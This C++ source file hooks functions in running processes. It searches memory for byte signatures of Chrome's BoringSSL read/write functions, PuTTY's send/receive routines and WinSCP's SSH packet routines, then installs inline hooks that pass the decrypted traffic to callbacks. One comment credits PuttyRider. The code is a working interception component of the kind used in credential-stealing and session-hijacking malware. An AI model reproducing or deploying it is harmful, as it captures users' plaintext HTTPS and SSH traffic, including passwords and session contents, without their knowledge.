
#include "stdafx.h"
#include "NonExportedHooks.h"

// New version of Chrome - BoringSSL

void HookChrome()
{
	SECTION_INFO rdata = {0, 0};
	SECTION_INFO text  = {0, 0};

	// Specific binary data

	unsigned char Read_Signature[]  = { 
		0x55, 0x8B, 0xEC, 0x56, 0x8B, 0x75, 0x08, 0x83, 0x7E, 0x1C, 0x00, 0x75, 0x20, 0x68, 0x54, 0x02, 
		0x00, 0x00, 0x68, '?', '?', '?', '?', 0x68, 0xE2, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x6A, 0x10, 
		0xE8, 0x4E, 0xBE, 0xE3, 0xFF, 0x83, 0xC4, 0x14, 0x83, 0xC8, 0xFF, 0xEB, 0x28, 0xF6, 0x46, 0x20, 
		0x02, 0x74, 0x0B, 0xC7, 0x46, 0x60, 0x01, 0x00, 0x00, 0x00, 0x33, 0xC0, 0xEB, 0x17, 0xE8, 0x23, 
		0x30, 0xE0, 0xFF, 0x8B, 0x46, 0x08, 0x6A, 0x00, 0xFF, 0x75, 0x10, 0xFF, 0x75, 0x0C, 0x56, 0xFF, 
		0x50, 0x18, 0x83, 0xC4, 0x10, 0x5E, 0x5D, 0xC3 };

	unsigned char Write_Signature[] = { 
		0x55, 0x8B, 0xEC, 0x56, 0x8B, 0x75, 0x08, 0x33, 0xC0, 0x39, 0x46, 0x1C, 0x75, 0x1F, 0x68, 0x71, 
		0x02, 0x00, 0x00, 0x68, '?', '?', '?', '?', 0x68, 0xE2, 0x00, 0x00, 0x00, 0x50, 0x6A, 0x10, 
		0xE8, 0xAE, 0xCA, 0xE3, 0xFF, 0x83, 0xC4, 0x14, 0x83, 0xC8, 0xFF, 0xEB, 0x33, 0xF6, 0x46, 0x20, 
		0x01, 0x74, 0x18, 0x68, 0x77, 0x02, 0x00, 0x00, 0x68, '?', '?', '?', '?', 0xC7, 0x46, 0x60, 
		0x01, 0x00, 0x00, 0x00, 0x68, 0xC2, 0x00, 0x00, 0x00, 0xEB, 0xD2, 0xE8, 0x76, 0x3C, 0xE0, 0xFF, 
		0xFF, 0x75, 0x10, 0x8B, 0x46, 0x08, 0xFF, 0x75, 0x0C, 0x56, 0xFF, 0x50, 0x24, 0x83, 0xC4, 0x0C, 
		0x5E, 0x5D, 0xC3, 0x55, 0x8B, 0xEC, 0xFF, 0x75, 0x10, 0xFF, 0x75, 0x0C, 0x6A, 0x17, 0xFF, 0x75, 
		0x08, 0xE8, 0xF3, 0x61, 0xE0, 0xFF, 0x83, 0xC4, 0x10, 0x5D, 0xC3 };

	// Get section

	text  = Process::GetModuleSection("chrome.dll", ".text");

	// Check if chrome

	if(text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Chrome text section!");
		return;
	}

	// Search memory

	DWORD pRead  = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Read_Signature, sizeof(Read_Signature));
	DWORD pWrite = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Write_Signature, sizeof(Write_Signature));

	if(pRead == 0 || pWrite == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Chrome SSL functions!");
		return;
	}

	// Add hooks

	SSL_Read_Original = (SSL_Read_Typedef)pRead;
	SSL_Write_Original = (SSL_Write_Typedef)pWrite;

	Hooker::AddHook((void *)pRead, (void *)SSL_Read_Callback);
	Hooker::AddHook((void *)pWrite, (void *)SSL_Write_Callback);
}

// Hook Putty - (c) PuttyRider - Adrian Furtuna

void HookPutty()
{
	SECTION_INFO text  = {0, 0};
	unsigned char SEND_string[] = {0x51, 0x53, 0x55, 0x56, 0x8b, 0x74, 0x24, 0x14, 0x57, 0x8b, 
		0x7c, 0x24, 0x20, 0x33, 0xed, 0x3b, 0xfd, 0x89, 0x6c, 0x24, 0x10 };
	unsigned char RECV_string[] = {0x56, 0xff, 0x74, 0x24, 0x14, 0x8b, 0x74, 0x24, 0x0c, 0xff, 
		0x74, 0x24, 0x14, 0x8d, 0x46, 0x60, 0x50, 0xe8};

	//Get .text section

	text  = Process::GetModuleSection("putty.exe", ".text");

	if(text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Putty section!");
		return;
	}

	// Serach functions

	DWORD pSend = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, 21);
	DWORD pRecv = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, 18);

	if(pSend == 0 || pRecv == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Putty functions!");
		return;
	}

	// Add hooks

	PuttySend_Original = (PuttySend_Typedef)pSend;
	PuttyRecv_Original = (PuttyRecv_Typedef)pRecv;

	Hooker::AddHook((void *)pSend, (void *)PuttySend_Callback);
	Hooker::AddHook((void *)pRecv, (void *)PuttyRecv_Callback);
}

// Hook WinSCP

void HookWinSCP()
{
	SECTION_INFO text  = {0, 0};
	unsigned char SEND_string[] = { 0x55, 0x8B, 0xEC, 0x8B, 0x55, 0x0C, 0x8B, 0x45, 0x08, 0x83, 0xB8, 0x2C, 0x01, 0x00, 0x00 };
	unsigned char RECV_string[] = { 0x55, 0x8B, 0xEC, 0x83, 0xC4, 0xE4, 0x53, 0x56, 0x57, 0x8B, 0x75, 0x10, 0x8B, 0x5D, 0x08 };

	//Get .text section

	text  = Process::GetModuleSection("winscp.exe", ".text");

	if(text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get WinSCP section!");
		return;
	}

	// Serach functions

	DWORD pSend = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, 15);
	DWORD pRecv = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, 15);

	if(pSend == 0 || pRecv == 0)
	{
		DebugLog::Log("[ERROR] Cannot get WinSCP functions!");
		return;
	}

	// Add hooks

	SSH_Pktsend_Original = (SSH_Pktsend_Typedef)pSend;
	SSH_Rdpkt_Original = (SSH_Rdpkt_Typedef)pRecv;

	Hooker::AddHook((void *)pSend, (void *)SSH_Pktsend_Callback);
	Hooker::AddHook((void *)pRecv, (void *)SSH_Rdpkt_Callback);
}

